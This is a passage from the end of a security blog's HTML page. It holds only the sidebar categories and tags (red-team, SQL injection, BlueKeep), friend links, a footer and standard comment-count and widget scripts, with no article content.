});</script><script type="text/javascript" id="disqus-count-script">$(function() {
     var xhr = new XMLHttpRequest();
     xhr.open('GET', '//disqus.com/next/config.json', true);
     xhr.timeout = 2500;
     xhr.onreadystatechange = function () {
       if (xhr.readyState === 4 && xhr.status === 200) {
         $('.post-meta .post-comments-count').show();
         var s = document.createElement('script');
         s.id = 'dsq-count-scr';
         s.src = 'https://Patrilic.disqus.com/count.js';
         s.async = true;
         (document.head || document.body).appendChild(s);
       }
     };
     xhr.ontimeout = function () { xhr.abort(); };
     xhr.send(null);
   });
</script></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://patrilic.top"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> åˆ†ç±»</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ATT-CK/">ATT&CK</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/BypassUac/">BypassUac</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Diary/">Diary</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Red-Team-Tricks/">Red-Team Tricks</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/SQLi-Tricks/">SQLi Tricks</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Skills/">Skills</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Threat-Intelligence/">Threat Intelligence</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Write-up/">Write-up</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/æ¼æ´å¤ç°/">æ¼æ´å¤ç°</a><span class="category-list-count">8</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> æ ‡ç­¾</i></div><div class="tagcloud"><a href="/tags/metasploit/" style="font-size: 15px;">metasploit</a> <a href="/tags/BlueKeep/" style="font-size: 15px;">BlueKeep</a> <a href="/tags/Windowsææƒ/" style="font-size: 15px;">Windowsææƒ</a> <a href="/tags/DLL-Hijacking/" style="font-size: 15px;">DLL Hijacking</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/Backdoor/" style="font-size: 15px;">Backdoor</a> <a href="/tags/ä»£ç å®¡è®¡/" style="font-size: 15px;">ä»£ç å®¡è®¡</a> <a href="/tags/n1ctf-pentest/" style="font-size: 15px;">n1ctf-pentest</a> <a href="/tags/Forcepoint-VPN/" style="font-size: 15px;">Forcepoint VPN</a> <a href="/tags/SQLæ³¨å…¥/" style="font-size: 15px;">SQLæ³¨å…¥</a> <a href="/tags/å†…ç½‘æ¸—é€/" style="font-size: 15px;">å†…ç½‘æ¸—é€</a> <a href="/tags/proc/" style="font-size: 15px;">proc</a> <a href="/tags/Struts2/" style="font-size: 15px;">Struts2</a> <a href="/tags/å¨èƒæƒ…æŠ¥/" style="font-size: 15px;">å¨èƒæƒ…æŠ¥</a> <a href="/tags/Git/" style="font-size: 15px;">Git</a> <a href="/tags/æ–‡ä»¶ä¸Šä¼ /" style="font-size: 15px;">æ–‡ä»¶ä¸Šä¼ </a> <a href="/tags/å‘½ä»¤æ‰§è¡Œ/" style="font-size: 15px;">å‘½ä»¤æ‰§è¡Œ</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> å‹æƒ…é“¾æ¥</i></div><ul></ul><a href="https://balis0ng.com" title="balis0ng" target="_blank">balis0ng</a><ul></ul><a href="https://evi1cg.me/" title="evi1cg's Blog" target="_blank">evi1cg's Blog</a><ul></ul><a href="http://hpdoger.cn" title="Hpdoger" target="_blank">Hpdoger</a><ul></ul><a href="http://0day.design" title="Passer6y" target="_blank">Passer6y</a><ul></ul><a href="http://adm1n.design" title="Hu3sky" target="_blank">Hu3sky</a><ul></ul><a href="http://0xa1paca.top" title="0xa1paca" target="_blank">0xa1paca</a><ul></ul><a href="http://noel.xin/" title="Noel's Blog" target="_blank">Noel's Blog</a><ul></ul><a href="https://www.0akarma.com" title="0aKarmA" target="_blank">0aKarmA</a><ul></ul><a href="https://www.cnblogs.com/H4lo" title="H4lo" target="_blank">H4lo</a><ul></ul><a href="https://www.kingkk.com/" title="Kingkk's Blog" target="_blank">Kingkk's Blog</a><ul></ul><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright Â© 2019 <a href="/." rel="nofollow">Patrilic's blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"tagMode":false});</script></body></html>